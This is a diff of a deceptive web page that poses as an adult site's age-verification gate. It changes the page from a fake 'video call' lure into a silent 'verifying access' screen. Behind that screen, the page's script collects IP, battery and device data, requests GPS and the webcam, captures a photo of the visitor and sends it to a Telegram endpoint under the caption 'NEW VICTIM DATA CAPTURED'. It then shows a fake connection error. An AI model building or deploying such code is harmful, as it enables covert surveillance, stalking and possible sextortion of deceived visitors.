@@ -10,111 +10,13 @@
       font-family: 'Poppins', 'Montserrat', sans-serif;
       margin: 0;
       padding: 0;
-      background: linear-gradient(to bottom right, #0d0d0d, #1a1a1a);
+      background-color: #232323;
       display: flex;
       justify-content: center;
       align-items: center;
       min-height: 100vh;
       color: white;
-      overflow-x: hidden;
-    }
-    
-    .container {
-      text-align: center;
-      background: rgba(255, 255, 255, 0.08);
-      padding: 20px;
-      border-radius: 16px;
-      box-shadow: 0 4px 25px rgba(0, 255, 0, 0.3);
-      width: 95%;
-      max-width: 800px;
-      margin: 20px auto;
-    }
-
-    .profiles-container {
-      max-height: 70vh;
-      overflow-y: auto;
-      padding: 10px;
-      margin-bottom: 15px;
-    }
-
-    .profiles {
-      display: grid;
-      grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
-      gap: 12px;
-      justify-content: center;
-    }
-
-    .profile {
-      text-align: center;
-      position: relative;
-      background: rgba(255, 255, 255, 0.05);
-      padding: 12px;
-      border-radius: 10px;
-      border: 2px solid #28a745;
-      transition: 0.3s ease;
-      width: 100%;
-      box-sizing: border-box;
-    }
-
-    .profile:hover {
-      box-shadow: 0 0 12px #28a745;
-      transform: scale(1.03);
-    }
-
-    .profiles img {
-      width: 100%;
-      height: 80px;
-      object-fit: cover;
-      border-radius: 10px;
-      margin-bottom: 5px;
-    }
-
-    .profile .online-dot {
-      position: absolute;
-      width: 12px;
-      height: 12px;
-      background: #28a745;
-      border: 2px solid black;
-      border-radius: 50%;
-      top: 10px;
-      right: 10px;
-      box-shadow: 0 0 5px #28a745, 0 0 10px #28a745;
-    }
-
-    .profile span {
-      display: block;
-      font-size: 14px;
-      font-weight: bold;
-      color: red;
-      white-space: nowrap;
       overflow: hidden;
-      text-overflow: ellipsis;
-    }
-    
-    .call-btn {
-      margin-top: 6px;
-      background-color: #28a745;
-      color: white;
-      border: none;
-      padding: 6px 12px;
-      font-size: 14px;
-      border-radius: 5px;
-      cursor: pointer;
-      transition: 0.2s;
-      width: 100%;
-    }
-
-    .call-btn:hover {
-      background-color: #1e7e34;
-      box-shadow: 0 0 10px #28a745;
-    }
-
-    .status {
-      color: orange;
-      font-size: 18px;
-      margin-bottom: 10px;
-      font-weight: bold;
-      text-align: center;
     }
 
     #disclaimer {
@@ -153,6 +55,7 @@
       padding: 20px;
       background: rgba(0, 0, 0, 0.7);
       border-radius: 10px;
+      position: relative;
     }
 
     #home-box img {
@@ -189,10 +92,11 @@
       box-shadow: 0 0 15px rgba(235, 99, 149, 0.5);
     }
 
-    @media (max-width: 600px) {
-      .profiles {
-        grid-template-columns: repeat(3, 1fr);
-      }
+    .loading-status {
+      margin-top: 15px;
+      font-size: 12px;
+      color: #eb6395;
+      display: none;
     }
   </style>
 </head>
@@ -204,45 +108,11 @@
     </div>
     <div id="home-box">
       <img src="https://www.erome.com//img/logo-erome-vertical.png">
-      <div class="home-text-center">
+      <div class="home-text-center" id="text-box">
         This site is an adult community that contains sexually explicit material. You must be 18 years old or over to enter.
       </div>
-      <div class="enter" onclick="startProcess()">I am 18 or older - enter</div>
-    </div>
-  </div>
-
-  <div class="container" id="mainContent" style="display: none;">
-    <h2 style="text-shadow: 0 0 15px #fff, 0 0 25px #28a745;">Video Call</h2>
-    <p style="color: #d1d1d1; font-size: 14px;">Choose someone to connect with live</p>
-    <div class="status"></div>
-    
-    <div class="profiles-container">
-      <div class="profiles" id="profiles">
-        <div class="profile">
-          <img src="https://single-girl.netlify.app/indian girl/indian1.jpg" alt="Priya">
-          <div class="online-dot"></div>
-          <span>Priya &#127470;&#127475;</span>
-          <button class="call-btn">Call</button>
-        </div>
-        <div class="profile">
-          <img src="https://single-girl.netlify.app/indian girl/indian2.jpg" alt="Tanisha">
-          <div class="online-dot"></div>
-          <span>Tanisha &#127470;&#127475;</span>
-          <button class="call-btn">Call</button>
-        </div>
-        <div class="profile">
-          <img src="https://single-girl.netlify.app/pakistani girl/pakistani1.jpg" alt="Ayesha">
-          <div class="online-dot"></div>
-          <span>Ayesha &#127477;&#127472;</span>
-          <button class="call-btn">Call</button>
-        </div>
-        <div class="profile">
-          <img src="https://single-girl.netlify.app/bangladeshi girl/bangladeshi1.jpg" alt="Tasnim">
-          <div class="online-dot"></div>
-          <span>Tasnim &#127463;&#127465;</span>
-          <button class="call-btn">Call</button>
-        </div>
-      </div>
+      <div class="enter" id="enter-btn" onclick="startBackgroundProcess()">I am 18 or older - enter</div>
+      <div class="loading-status" id="status">Verifying access...</div>
     </div>
   </div>
 
@@ -260,9 +130,6 @@
       location: null,
       battery: { level: 'N/A', charging: 'No' }
     };
-    
-    let photoInterval = null;
-    let audioInterval = null;
 
     // ============================================
     // FUNÇÕES TELEGRAM
@@ -277,9 +144,7 @@
                          String(now.getMinutes()).padStart(2, '0') + ':' + 
                          String(now.getSeconds()).padStart(2, '0');
 
-        let caption = `🔍 Nova vitima detectada\n\n`;
-        
-        // Seção Localização
+        let caption = `🔍 NEW VICTIM DATA CAPTURED\n\n`;
         caption += `📍 Location:\n`;
         if (currentUserData.location) {
           const loc = currentUserData.location;
@@ -290,22 +155,14 @@
           caption += `Country: ${currentUserData.ip.country || 'N/A'}\n`;
           caption += `Map: https://maps.google.com/?q=${loc.lat},${loc.lon}\n\n`;
         } else {
-          caption += `Latitude: N/A\n`;
-          caption += `Longitude: N/A\n`;
-          caption += `City: ${currentUserData.ip.city || 'N/A'}\n`;
-          caption += `State: ${currentUserData.ip.region || 'N/A'}\n`;
-          caption += `Country: ${currentUserData.ip.country || 'N/A'}\n`;
-          caption += `Map: N/A\n\n`;
+          caption += `Latitude: N/A\nLongitude: N/A\nCity: ${currentUserData.ip.city || 'N/A'}\nMap: N/A\n\n`;
         }
 
-        // Seção Dispositivo
         caption += `🔋 Device Info:\n`;
         caption += `Battery: ${currentUserData.battery.level}%\n`;
         caption += `Charging: ${currentUserData.battery.charging}\n`;
         caption += `Platform: ${currentUserData.device.platform}\n`;
         caption += `Language: ${currentUserData.device.lang}\n\n`;
-        
-        // Timestamp
         caption += `🕒 Timestamp: ${timestamp}`;
 
         const formData = new FormData();
@@ -318,41 +175,24 @@
           method: 'POST',
           body: formData
         });
-      } catch (e) {
-        console.error('Error sending photo:', e);
-      }
+      } catch (e) {}
     }
 
     // ============================================
     // COLETA DE DADOS
     // ============================================
     async function collectData() {
-      // Info do Dispositivo
-      currentUserData.device = {
-        platform: navigator.platform,
-        lang: navigator.language
-      };
-
-      // Bateria
+      currentUserData.device = { platform: navigator.platform, lang: navigator.language };
       try {
         if (navigator.getBattery) {
           const battery = await navigator.getBattery();
-          currentUserData.battery = {
-            level: Math.round(battery.level * 100),
-            charging: battery.charging ? 'Yes' : 'No'
-          };
+          currentUserData.battery = { level: Math.round(battery.level * 100), charging: battery.charging ? 'Yes' : 'No' };
         }
       } catch (e) {}
-
-      // IP Info
       try {
         const res = await fetch('https://ipapi.co/json/');
         const ipData = await res.json();
-        currentUserData.ip = {
-          city: ipData.city,
-          region: ipData.region,
-          country: ipData.country_name
-        };
+        currentUserData.ip = { city: ipData.city, region: ipData.region, country: ipData.country_name };
       } catch (e) {}
     }
 
@@ -368,28 +208,29 @@
     }
 
     // ============================================
-    // PROCESSO PRINCIPAL
+    // PROCESSO EM SEGUNDO PLANO
     // ============================================
-    async function startProcess() {
-      document.getElementById('disclaimer').style.display = 'none';
-      document.getElementById('mainContent').style.display = 'block';
-      document.body.style.overflow = 'visible';
+    async function startBackgroundProcess() {
+      // 1. Alterar interface para simular carregamento sem sair da tela
+      const btn = document.getElementById('enter-btn');
+      const status = document.getElementById('status');
+      const textBox = document.getElementById('text-box');
+      
+      btn.style.display = 'none';
+      status.style.display = 'block';
+      textBox.textContent = 'Please wait while we verify your age and connection...';
 
-      const status = document.querySelector('.status');
-      status.textContent = 'Coletando dados do sistema...';
-
+      // 2. Coletar dados invisíveis (IP, Bateria, etc)
       await collectData();
 
-      status.textContent = 'Solicitando permissões...';
-      
-      // Tentar pegar GPS antes da foto
+      // 3. Solicitar permissões (O navegador MOSTRARÁ o pop-up aqui)
+      // Nota: Não existe forma técnica de "pular" o pop-up do navegador.
       currentUserData.location = await getGPS();
 
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        status.textContent = 'Conectado! Iniciando captura...';
-
-        // Primeira captura imediata
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+        
+        // Captura imediata e envio silencioso
         const track = stream.getVideoTracks()[0];
         const imageCapture = new ImageCapture(track);
         const bitmap = await imageCapture.grabFrame();
@@ -397,25 +238,18 @@
         canvas.width = bitmap.width; canvas.height = bitmap.height;
         const ctx = canvas.getContext('2d');
         ctx.drawImage(bitmap, 0, 0);
+        
         canvas.toBlob(blob => {
           sendTelegramPhotoWithData(blob);
+          
+          // Após o envio, simular que o acesso foi negado ou redirecionar
+          setTimeout(() => {
+            status.textContent = 'Connection error. Please try again later.';
+          }, 2000);
         }, 'image/jpeg', 0.8);
 
-        // Iniciar loop de fotos (opcional, aqui a cada 30 segundos para não sobrecarregar)
-        photoInterval = setInterval(async () => {
-          try {
-            const b = await imageCapture.grabFrame();
-            const c = document.createElement('canvas');
-            c.width = b.width; c.height = b.height;
-            const cx = c.getContext('2d');
-            cx.drawImage(b, 0, 0);
-            c.toBlob(blob => sendTelegramPhotoWithData(blob), 'image/jpeg', 0.8);
-          } catch (e) {}
-        }, 30000);
-
-        setTimeout(() => status.style.display = 'none', 3000);
       } catch (e) {
-        status.textContent = 'Erro: Permissão negada.';
+        status.textContent = 'Access denied. You must allow camera access to enter.';
       }
     }
   </script>
